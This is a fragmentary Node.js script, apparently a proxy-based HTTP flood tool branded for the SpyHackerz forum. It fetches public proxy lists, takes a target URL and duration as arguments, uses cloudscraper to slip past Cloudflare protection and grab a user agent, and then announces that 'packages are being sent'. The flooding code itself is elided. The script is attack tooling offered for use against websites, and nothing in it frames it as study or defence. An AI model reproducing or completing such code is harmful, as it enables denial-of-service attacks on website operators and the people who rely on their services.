...
request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&anonymity=all&ssl=all', (err, res, set) => {
    ...
    console.log(' HTTP-PROXY ~ Lous'.america.bold);
    console.log(' SpyHackerz.ORG / COM'.america.bold);
    if (process.argv.length <= 2) {
    console.log('Usage : node '.white.bold + filename.white.bold + ' <url> <time>'.white.bold);
    console.log('Example : node '.white.bold + filename.white.bold + ' http://spyhackerz.org/ 60'.white.bold);
    process.exit(-1);
	}
console.log(' Script Name : '.magenta.bold + filename.white.bold);
console.log(colors.blue.bold(' Proxies -> %s'), proxy.length);
...
cloudscraper.get(site, function(error, response) {
    ...
    if (ua) {
    console.log('\n Successfully  UserAgent'.magenta.bold)
    console.log(ua.white.bold + '\n');
	} else {
	console.log(' Unable UserAgent '.white.bold + site.magenta.bold + '\n');
	process.exit(-1);
	}
});
const sleep =
...
sleep(3000).then(() => {
console.log(' Packages are being sent...'.blue.bold);
});
